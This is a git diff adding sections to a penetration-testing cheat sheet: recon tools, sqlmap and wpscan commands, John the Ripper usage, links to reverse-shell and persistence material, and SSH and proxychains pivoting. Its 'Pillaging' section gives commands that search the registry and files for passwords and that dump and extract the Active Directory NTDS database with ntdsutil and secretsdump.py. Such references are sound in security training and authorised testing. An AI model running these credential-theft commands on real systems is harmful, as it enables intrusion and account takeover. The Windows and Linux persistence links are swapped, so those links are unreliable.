@@ -25,7 +25,8 @@
 
 **5. [Exploitation](#5-exploitation)**
 
-* [Reverse Shell useful links](#reverse-shells-useful-links)
+* [Reverse Shell useful links](#reverse-shells-useful-links--others)
+* [sqlmap](#sqlmap)
 * [Netcat](#netcat)
 * [Socat](#socat)
 * [Metasploit](#metasploit)
@@ -50,8 +51,17 @@
 
 **10. [Persistence](#10-persistence)**
 
-**11. [Cleanup](#11-cleanup)**
+* [Windows](#windows)
+* [Linux](#linux)
 
+**11. [Pillaging](#11-pillaging)**
+
+**12. [Pivoting](#12-pivoting)**
+
+* [General](#general)
+* [SSH](#ssh)
+* [Proxychains](#proxychains)
+* [Chisel](#chisel)
 
 ## 1. Other Cheatsheets/Libraries:
 [Lolbas-Project](https://lolbas-project.github.io/)
@@ -61,6 +71,9 @@
 [GTFOBins](https://gtfobins.github.io/)
 
 [MITRE ATT&CK](https://attack.mitre.org/)
+
+[InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings/
+)
 
 ## 2. General Tools:
 
@@ -153,6 +166,26 @@ https://ui.ctsearch.entrust.com/ui/ctsearchui
 
 [WPscan - Website](https://wpscan.com/#solutions)
 
+[Sherlock - "Hunt down social media accounts by username across social networks"](https://github.com/sherlock-project/sherlock)
+
+
+recon-ng:
+- modules have to be installed over a marketplace
+- search: `marketplace search <name ex. Github>`
+- info: `marketplace info <modulename>`
+- install: `marketplace install <modulename>`
+- load: `marketplace load <modulename>`
+    - via `info` options are shown
+    - `option set <options>`
+- `run` for running module
+- `back` for leaving module
+
+[theHarvester](https://github.com/laramies/theHarvester)
+-d target-domain
+-b data source for search (ex. google)
+-e specification for dns server
+
+
 #### Google Dorking:
 
 -> [use the google advanced search](https://www.google.com/advanced_search)
@@ -175,6 +208,11 @@ dirb <url> /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 ```
 gobuster dir --url <url> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt   
 ```
+
+#### wpscan:
+
+`wpscan --url <url> --plugins-detection aggressive`
+
 Domain Enumeration:
 ```
 dig @<server> <domain_name> <type>
@@ -284,7 +322,7 @@ nmap <scan_type> <options> <machine_ip/network>
 
 ## 5. Exploitation:
 
-### Reverse Shells useful links:
+### Reverse Shells useful links & Others:
 https://github.com/martinsohn/PowerShell-reverse-shell
 
 https://www.revshells.com/
@@ -292,6 +330,16 @@ https://www.revshells.com/
 https://github.com/samratashok/nishang/tree/master
 
 [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+
+[Introduction to writing shell code](https://www.exploit-db.com/papers/13224)
+
+[Ciphey](https://github.com/Ciphey/Ciphey)
+
+### sqlmap:
+
+`sqlmap -u <target-URL>`
+
+https://medium.com/@cuncis/the-ultimate-sqlmap-tutorial-master-sql-injection-and-vulnerability-assessment-4babdc978e7d
 
 ### Netcat:
 Reverse Shell:
@@ -395,7 +443,7 @@ Example for Windows
 
 ![Metasploit](images/Metasploit.png)
 
-### Msfvenom:
+### [Msfvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/):
 
 use `exploit/multi/handler` to catch rev-shells
 
@@ -758,17 +806,26 @@ options:
 ### John the Ripper:
 https://www.openwall.com/john/
 ````
+automatic: 
+     john --wordlist=<path_to_wordlist> <path_to_file>
+        -> add --format=<hash_format> when known
+            -> for standard hash types like md5 you have to add "raw-" as prefix
+            -> overview of formats: john --list=formats | grep -iF "<>"
 
+unshadow <path_to_passwd> <path_to_shadow>
 
 single crackmode:
+    john --single --format=<format> <path_to_file>
+
 
 custom crack rules:
+    add rules in /etc/john/john.conf
 
-zip-files:  zip2john <zip_file> > <zip_hash>
-
-rar-files:  rar2john <rar_archive> > <rar_hash>
-
-ssh-keys:   ssh2john <>
+Extensions for specific data types:
+    zip-files:  zip2john <zip_file> > <zip_hash>
+    rar-files:  rar2john <rar_archive> > <rar_hash>
+    ssh-keys:   ssh2john <id_rsa private key file> > [output_file]
+    etc.
 
 ````
 
@@ -797,10 +854,70 @@ copy a file from local to remote server: scp <local_file_path> <username>@<ip>:<
 
 copy file from remote server to local host: scp <ip>:<remote_file_path> <local_save_path>
 
-
-
 copy directory: scp -r <directory> <username>@<ip>:<path_to_remote_directory>
 ```
 ## 10. Persistence:
 
-## 11. Cleanup:
+### Windows:
+
+    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md9
+
+### Linux: 
+
+    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md
+
+## 11. Pillaging:
+
+[evil-winrm](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/)
+
+`reg query HKLM /f password /t REG_SZ /s`
+
+`findstr /si password *.xml *.ini *.txt`
+
+`ntdsutil "ac in ntds" "ifm" "cr fu c:\temp" q q`
+
+-> create full backup from NTDS-database and saves it in c:\temp
+
+`secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit -outputfile <>`
+
+## 12. Pivoting:
+
+### General:
+1. https://github.com/t3l3machus/pentest-pivoting
+2. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md#network-pivoting-techniques
+3. https://cocomelonc.github.io/pentest/2021/11/04/pivoting-1.html
+4. https://cocomelonc.github.io/pentest/2021/11/08/pivoting-2.html
+5. https://www.techtalk.andriejsazanowicz.com/2023/03/25/hide-your-ip-with-a-proxychains-and-tor-network/
+
+### SSH:
+
+bind adress doesn't have to be used all the time
+
+local port forwarding:
+
+`ssh -L [bindddr]:[port]:[dsthost]:[dstport] [user]@[host]`
+
+remote port forwarding:
+
+`ssh -R [bindddr]:[port]:[localhost]:[localport] [user]@[host]`
+
+SOCKS:
+
+`ssh -D 8080 [user]@[host]`
+
+-f  background
+
+-N  do not execute a remote command 
+
+
+### Proxychains:
+
+- `sudo apt-get install proxychains`
+- config file @ /etc/proxychains.conf
+- add proxy server `<server-type(socks5)> <ip> <port>`
+- select proxy type (strict, dynamic,random) by removing # in front of line
+- `proxychains <application> <application_options>`
+
+### Chisel:
+    
+    https://ap3x.github.io/posts/pivoting-with-chisel/
